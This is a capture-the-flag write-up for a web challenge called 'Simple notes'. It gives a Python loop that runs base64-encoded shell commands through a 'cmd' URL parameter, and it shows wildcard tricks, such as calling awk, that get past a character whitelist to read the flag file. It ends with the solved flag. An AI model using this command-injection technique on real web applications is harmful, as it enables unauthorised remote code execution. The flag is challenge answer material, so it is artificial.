# Simple notes (web, 50p, 16 solved)

In the challenge we get access to some simple webapp, where each user gets his own sandbox and then we can theoretically upload `small files`, and there are some options to list our files.

If we look closely, the listing feature actually includes `cmd` GET parameter, which contains base64 encoded shell command.
This means we can do:

```python
import requests


def main():
    token = "HlGQedjDN9z4rFF2l2wUrpf551q2wjDI6mBXDwue"
    while True:
        url = "https://simple-notes.dctf-final.def.camp/router.php?token=" + token + "&cmd="
        payload = input(">")
        r = requests.get(url + payload.encode("base64"))
        print(r.text)


main()
```

To get a sort-off reverse shell.
There was a pretty strict whitelist of allowed characters, but since `ls -la *` was the "standard" command, you had at least those characters.

The idea was to figure out that you can upload only 1 byte-long files, and get RCE by sending `*` in a directory with a bunch of files with names which would combine into a shell command.

However, this was visible for other teams, and also a bit problematic, so we came up with an easier idea -> use shell wildcards to reach files we want.

First we listed all files via `ls -la /*/*` and found the flag location.
Then we created payload `/*a*/www/**/**/*.p*` to reach the flag file in `/var/www/html/flag/flag.php` and tried to reach some binary which could print the flag for us.

It took a moment, because with limited charset it's hard to reach the one particular binary you want, and most classic options like `cat` were not doable.
Finally we found that calling `awk 4 filename` will do the trick and we could get this one via `/*s*/*/aw* 4 /*a*/www/**/**/*.p*` and read the flag `DCTF{06246a82f83ee63876087293874010cde73a269d8d227605d50d238850faca0c}`
